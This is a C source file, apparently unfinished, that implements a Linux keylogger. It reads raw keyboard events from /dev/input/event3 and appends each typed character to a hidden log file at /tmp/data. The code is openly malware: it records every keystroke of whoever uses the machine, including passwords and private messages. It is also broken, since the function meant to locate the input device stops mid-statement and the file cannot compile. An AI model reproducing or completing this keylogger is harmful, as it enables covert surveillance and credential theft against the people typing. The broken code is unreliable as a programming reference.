#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>

#define LOGFILE "/tmp/data"

char *get_event_file() {
	FILE *fptr = fopen("/proc/bus/input/devices", "r");
	// Error handling?
	
	if (fptr==NULL) {
		printf("[ERROR] Couldn't open /proc/bus/input/devices\n");
		exit(-1);
	}

	while (fscanf(fptr, // I need more practice
}

int start_keylogger() {
	struct input_event ev;
	char *map = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./";
	char *event_filename = get_event_file();
	int fd = open("/dev/input/event3", O_RDONLY);

	FILE *fp = fopen(LOGFILE, "a");
	if (fp == NULL) {
		printf("Error opening file!");
		return 0;
	}

	fprintf(fp, "Successfully started logger at TODO...\n");
	fflush(fp);


	while (1) {

		read(fd, &ev, sizeof(ev));
		if ((ev.type == EV_KEY) && (ev.value == 0)) {

			switch (ev.code) {

				case 28:
					fprintf(fp, "\n");
					break;
				case 57:
					fprintf(fp, " ");
					break;
				default:
					fprintf(fp, "%c", map[ev.code]);
		
			fflush(fp);

			}
		}
	}

	fclose(fp);
	return 0;
}
